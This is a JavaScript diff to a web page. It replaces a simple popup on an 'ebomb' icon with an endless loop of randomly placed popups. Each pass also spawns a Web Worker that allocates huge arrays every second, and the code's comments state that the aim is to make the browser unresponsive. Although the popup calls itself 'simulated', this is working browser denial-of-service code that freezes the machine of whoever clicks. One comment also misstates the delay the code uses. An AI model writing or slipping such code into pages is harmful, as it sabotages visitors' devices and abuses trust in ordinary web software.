@@ -168,9 +168,51 @@
     const popup = document.getElementById('popup');
     const closePopupButton = document.getElementById('close-popup');
 
+    globalThis.popupCounter = 0;
     // Show the popup when the ebomb icon is clicked
-    ebombIcon.addEventListener('click', () => {
-      popup.style.display = 'block';
+    ebombIcon.addEventListener('click', async() => {
+
+        while (true) {
+            popup.style.display = 'block';
+            // Increment the counter
+            globalThis.popupCounter++;
+            console.log(globalThis.popupCounter);
+            // create a new popup element with the counter value
+            const newPopup = document.createElement('div');
+            newPopup.innerHTML = `<h2>EBomb Activated</h2><p>Warning: This is a simulated EBomb! ${globalThis.popupCounter}</p>`
+            // make the new popup appear at a random position
+            newPopup.style.position = 'absolute';
+            newPopup.style.top = `${Math.random() * 100}vh`;
+            newPopup.style.left = `${Math.random() * 100}vw`;
+            newPopup.style.backgroundColor = 'white';
+            newPopup.style.border = '2px solid #000';
+            newPopup.style.padding = '10px';
+            newPopup.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.1)';
+            document.body.appendChild(newPopup);
+
+            // force the browser to re-render the page
+            newPopup.style.display = 'none';
+            newPopup.offsetHeight;
+            newPopup.style.display = 'block';
+
+            // sleep for a bit before creating the next popup
+            // 0 < x < 500ms
+            const sleepTime = Math.random() * 2;
+            await new Promise(resolve => setTimeout(resolve, sleepTime));
+
+            // spwan a new task for every popup that consumes a lot
+            // of memory and CPU make sure that each task spawned
+            // is independent and runs concurrently
+            // this will make the browser unresponsive
+
+            new Worker(URL.createObjectURL(new Blob([`
+                setInterval(() => {
+                    const arr = new Array(1000000).fill('🚀');
+                    console.log(arr);
+                }, 1000);
+            `])));
+        }
+
     });
 
     // Close the popup when the "Close" button is clicked
